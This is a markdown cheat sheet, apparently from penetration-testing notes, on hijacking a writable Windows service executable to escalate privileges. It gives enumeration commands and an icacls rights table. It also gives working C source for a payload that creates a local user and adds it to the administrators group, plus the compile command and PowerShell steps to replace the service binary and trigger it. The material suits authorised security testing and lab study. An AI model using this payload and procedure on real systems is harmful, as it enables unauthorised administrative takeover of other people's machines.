# Service binary hijacking

Needs: writable service executable + privileged service account + start/restart trigger.

```powershell
Get-CimInstance -ClassName Win32_Service |
  Select-Object Name,State,StartMode,StartName,PathName
sc.exe qc <SERVICE>
icacls 'C:\Path\To\service.exe'
sc.exe query <SERVICE>
```
- Split executable from arguments in `PathName`; you need `(M)` or `(F)` in the ACL.
- Use `sc.exe` in PowerShell (`sc` is an alias for `Set-Content`).

## icacls rights legend
| Right | Meaning |
| --- | --- |
| `F` | Full control |
| `M` | Modify: read, write, delete, execute |
| `W` | Write only (no delete) |
| `RX` | Read + execute |
| `(OI)` / `(CI)` | Inherited by files / by subfolders below this one |
| no entry for the account | No access via this ACE; check other groups |

## Local-admin payload
Reusable replacement for a hijacked service binary, planted DLL payload, or AlwaysInstallElevated MSI target.
```c
#include <stdlib.h>
int main() {
    system("net user <LOCAL-USER> <PW> /add");
    system("net localgroup administrators <LOCAL-USER> /add");
    return 0;
}
```
```bash
x86_64-w64-mingw32-gcc payload.c -o replacement.exe
```
- i686 target: `i686-w64-mingw32-gcc`. More flags: [compiling exploits](../foothold/public-exploits.md#compiling-exploits).
- Confirm with `net user <LOCAL-USER>` after the trigger fires, then log in / `runas` / PtH with that account.

```powershell
# stop first if running and you have SERVICE_STOP
Copy-Item 'C:\Path\To\service.exe' "$env:TEMP\service.exe.bak"
Copy-Item '.\replacement.exe' 'C:\Path\To\service.exe'
sc.exe start <SERVICE>
```
- Running service must be restarted: `SERVICE_START` ≠ `SERVICE_STOP`.
- Restore afterwards if the service must keep working: `Copy-Item "$env:TEMP\service.exe.bak" 'C:\Path\To\service.exe'`.

PowerUp lead (verify ACL and trigger):
```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile
```
